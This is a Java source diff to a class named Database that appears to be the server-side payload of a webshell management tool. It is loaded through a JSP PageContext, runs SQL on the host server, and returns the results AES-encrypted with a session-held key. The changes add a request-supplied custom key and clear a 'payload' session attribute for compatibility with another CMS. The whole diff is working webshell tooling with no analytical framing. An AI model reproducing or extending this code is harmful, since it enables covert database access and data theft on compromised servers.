@@ -19,6 +19,7 @@ import java.sql.DriverManager;
 import javax.servlet.ServletOutputStream;
 import java.util.Map;
 import java.util.HashMap;
+import javax.servlet.ServletRequest;
 import javax.servlet.jsp.PageContext;
 import javax.servlet.http.HttpSession;
 import javax.servlet.ServletResponse;
@@ -34,13 +35,19 @@ public class Database
     public static String sql;
     private ServletResponse Response;
     private HttpSession Session;
+    private ServletRequest Request;
     
     @Override
     public boolean equals(final Object obj) {
         final PageContext page = (PageContext)obj;
         this.Session = page.getSession();
         this.Response = page.getResponse();
+        this.Request = page.getRequest();
         final Map<String, String> result = new HashMap<String, String>();
+        //兼容zcms
+        if(Session.getAttribute("payload")!=null){
+            Session.removeAttribute("payload");
+        }
         try {
             this.executeSQL();
             result.put("msg", this.executeSQL());
@@ -126,7 +133,8 @@ public class Database
     }
     
     private byte[] Encrypt(final byte[] bs) throws Exception {
-        final String key = this.Session.getAttribute("u").toString();
+        final Object custmKeyObj = this.Request.getAttribute("parameters");
+        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
         final byte[] raw = key.getBytes("utf-8");
         final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
